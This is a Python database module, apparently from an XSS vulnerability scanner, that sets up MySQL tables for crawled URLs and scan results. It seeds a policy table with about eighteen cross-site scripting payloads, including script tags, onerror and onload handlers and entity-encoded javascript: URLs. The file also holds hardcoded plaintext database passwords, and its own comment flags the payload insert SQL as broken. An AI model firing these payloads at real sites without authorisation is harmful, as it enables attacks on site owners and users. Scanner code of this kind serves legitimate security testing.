#! /usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = "Taerg"

import MySQLdb


class mysqli():
    server = '127.0.0.1'
    port = '3306'
    username = 'taerg'
    password = 'hitaerg)0'
    charset = 'utf8mb4'
    db = 'taergtest'


class loggingDbConfig():
    server = '127.0.0.1'
    port = 3306  # int
    username = 'taerg'
    password = 'taergtest)0'
    charset = 'utf8'
    dbname = 'taerg'


def db_connect():
    try:
        return MySQLdb.connect(
            mysqli.server,
            mysqli.username,
            mysqli.password,
            mysqli.db,
            charset=mysqli.charset,
            port=int(mysqli.port)
        )
    except MySQLdb.Error as e:
        print("Mysql Error %d: %s" % (e.args[0], e.args[1]))
        return None


def db_init():
    try:
        conn = db_connect()
        cmd = conn.cursor()
        cmd.execute('set names utf8mb4')
        cmd.execute("""
                    CREATE TABLE IF NOT EXISTS `scan_result`(
                      `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                      `target` varchar(256) NOT NULL DEFAULT '',
                      `attack_url` varchar(1024) NOT NULL DEFAULT '',
                      `html_contents` longtext NOT NULL,
                      `flag` int(11) DEFAULT NULL,
                      PRIMARY KEY (`id`)
                    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
                    """)
        cmd.execute("""
                        CREATE TABLE IF NOT EXISTS `site_policy`(
                  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                  `target` varchar(256) NOT NULL DEFAULT '',
                  `xss_policy_id` int(11) NOT NULL,
                  `comment` tinytext,
                  PRIMARY KEY (`id`)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
                    """)
        cmd.execute("""
                        CREATE TABLE IF NOT EXISTS `third_urls`(
                  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                  `target` varchar(256) NOT NULL DEFAULT '',
                  `url` varchar(1024) DEFAULT NULL,
                  `post` text,
                  `referer` int(11) DEFAULT NULL,
                  `tag` varchar(64) DEFAULT NULL,
                  PRIMARY KEY (`id`)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
                    """)
        cmd.execute("""
                        CREATE TABLE IF NOT EXISTS `urls`(
                  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                  `target` varchar(256) NOT NULL DEFAULT '',
                  `url` varchar(1024) DEFAULT NULL,
                  `post` text,
                  `referer` int(11) DEFAULT NULL,
                  `tag` varchar(64) DEFAULT NULL,
                  PRIMARY KEY (`id`)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
                    """)
        cmd.execute("""
                        CREATE TABLE IF NOT EXISTS `xss_policy`(
                  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                  `policy_type` int(11) NOT NULL COMMENT 'xss策略类型,0-rexss,1-domxss,2-stxss',
                  `payloads` varchar(512) DEFAULT NULL,
                  `comment` tinytext,
                  PRIMARY KEY (`id`)
                ) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb4;
                    """)
        #以下sql存在问题，后需调试
        sql = """
                    INSERT INTO `xss_policy` (`id`, `policy_type`, `payloads`, `comment`)
                VALUES
                    (1,0,'<ScRiPt>alert(6)</ScRiPt>',NULL),
                    (2,0,'%2527);alert(6);//',NULL),
                    (3,0,'\'></title></textarea></xmp></iframe><script><frames></plaintext></form></script><iframe/onload=alert(6)></iframe>',NULL),
                    (4,0,'' style=x:expression() onmouseover=alert(6) '',NULL),
                    (5,0,'\"><ScriPt>alert(6)</ScriPt>',NULL),
                    (6,0,'\" onclick=\"document.write(\'<iframe/onload=alert(6)></iframe>\');\" x=\"',NULL),
                    (7,0,'javascript:alert(6)',NULL),
                    (8,0,'\"))}catch(e){alert(6);}//',NULL),
                    (9,0,'\"><img src=x onerror=alert(6);>',NULL),
                    (10,0,'&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;6&#41;',NULL),
                    (11,1,'' style=x:expression() onmouseover=alert(6) '',NULL),
                    (12,1,'#\"><img src=1 onerror=alert(6)>',NULL),
                    (13,1,'javascript:alert(6)',NULL),
                    (14,1,'&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;6&#41;',NULL),
                    (15,1,'#1\'\"></title></textarea></xmp></iframe></noscript></noframes></plaintext></form></script><iframe/'onload=alert(6)></iframe>,NULL),
                    (16,0,''"><img src=1 onerror=alert(6)>',NULL),
                    (17,1,'?iSubType=0'"><img src=1 onerror=alert(6)>','pvp.qq.com\nhttps://security.tencent.com/index.php/report/freelink/23912/0e54216ead7d6b792e176c98e650c35c'),
                    (18,0,'<ScRscriptiPt>AlealertRt(6)</ScRscriptiPt>',NULL);
        """
        print sql
        cmd.execute(sql)
        conn.commit()
    except MySQLdb.Error as e:
        print("Mysql Error %d: %s" % (e.args[0], e.args[1]))

def load_policy(policytype=0):
    try:
      conn = db_connect()
      cur = conn.cursor()
      sql = """SELECT payloads FROM xss_policy WHERE policy_type=%s"""
      cur.execute(sql,(policytype,))
      payloads = [item[0] for item in cur.fetchall()]
      return payloads
    except MySQLdb.Error as e:
        print("Mysql Error %d: %s" % (e.args[0], e.args[1]))


def insert_url_to_db(target, url, post, referer, tag):
    try:
        conn = db_connect()
        cur = conn.cursor()
        sql = (
            "INSERT INTO urls (id, target, url, post, referer, tag)"
            "VALUES (NULL, %(target)s, %(url)s, %(post)s, %(referer)s, %(tag)s)"
            )
        insert_data = {'target':target,
                       'url':url,
                       'post':post,
                       'referer':referer,
                       'tag':tag,
        }
        cur.execute(sql,insert_data)
        conn.commit()
    except MySQLdb.Error as e:
        print ("MySQL Error %d: %s"%(e.args[0], e.args[1]))

def insert_third_url_to_db(target, url, post, referer, tag):
    try:
        conn = db_connect()
        cur = conn.cursor()
        sql = (
            "INSERT INTO third_urls (id, target, url, post, referer, tag)"
            "VALUES (NULL, %(target)s, %(url)s, %(post)s, %(referer)s, %(tag)s)"
        )
        insert_data = {'target':target,
                       'url':url,
                       'post':post,
                       'referer':referer,
                       'tag':tag
        }
        cur.execute(sql,insert_data)
        conn.commit()
    except MySQLdb.Error as e:
        print "Mysql Error %d: %s" % (e.args[0], e.args[1])
        # logging.debug("MySQL Error %d: %s"%(e.args[0], e.args[1]))

def insert_scan_result_to_db(target, attack_url, html_contents, flag, scan_time):
    # print ("target:%s"%target)
    # print ("attack_url:%s"%attack_url)
    # print ("html_contents:%s"%MySQLdb.escape_string(html_contents))
    # print ("flag:%s"%flag)
    try:
        conn = db_connect()
        cur = conn.cursor()
        sql = (
          "INSERT INTO scan_result (id, target, attack_url, html_contents, flag, scan_time)"
          # "VALUES (NULL, %s, %s, %s, %s, %s)"
          "VALUES (NULL, %(target)s, %(attack_url)s, %(html_contents)s, %(flag)s, %(scan_time)s)"
          )
        insert_data = {
                       'target': target,
                       'attack_url': attack_url,
                       'html_contents': html_contents,
                       'flag': flag,
                       'scan_time': scan_time
                       }
        cur.execute(sql,insert_data)
        # cur.execute(sql,(target, attack_url, MySQLdb.escape_string(html_contents), flag))
        conn.commit()
    except MySQLdb.Error, e:
        print "Mysql Error %d: %s" % (e.args[0], e.args[1])

# def insert_into_urls(dbfile, url, html='none'):
#     dbfile1 = dbfile + '.db'
#     conn = sqlite3.connect(dbfile1)
#     conn.text_factory = str
#     cmd = conn.cursor()
#     cmd.execute("insert into data(url, html) values (?,?)", (url, html))
#     conn.commit()

def load_site_policey(host):
    try:
      conn = db_connect()
      cur = conn.cursor()
      sql = ("SELECT payloads FROM xss_policy WHERE policy_type = 0 "
             "AND id IN (SELECT xss_policy_id FROM site_policy WHERE target=%(host)s)")
      cur.execute(sql,{'host':host})
      # xss_policy_id = cur.fetchall()[0].split(',')
      # for i in xss_policy_id:
      #     print i
      payloads = [item[0] for item in cur.fetchall()]
      for i in payloads:
          print i
      return payloads
    except MySQLdb.Error as e:
        print("Mysql Error %d: %s" % (e.args[0], e.args[1]))

def load_site_policey_dom(host):
    try:
      conn = db_connect()
      cur = conn.cursor()
      sql = ("SELECT payloads FROM xss_policy WHERE policy_type = 1 "
             "AND id IN (SELECT xss_policy_id FROM site_policy WHERE target=%s)")
      cur.execute(sql,(host,))
      # xss_policy_id = cur.fetchall()[0].split(',')
      # for i in xss_policy_id:
      #     print i
      payloads = [item[0] for item in cur.fetchall()]
      for i in payloads:
          print i
      return payloads
    except MySQLdb.Error as e:
        print("Mysql Error %d: %s" % (e.args[0], e.args[1]))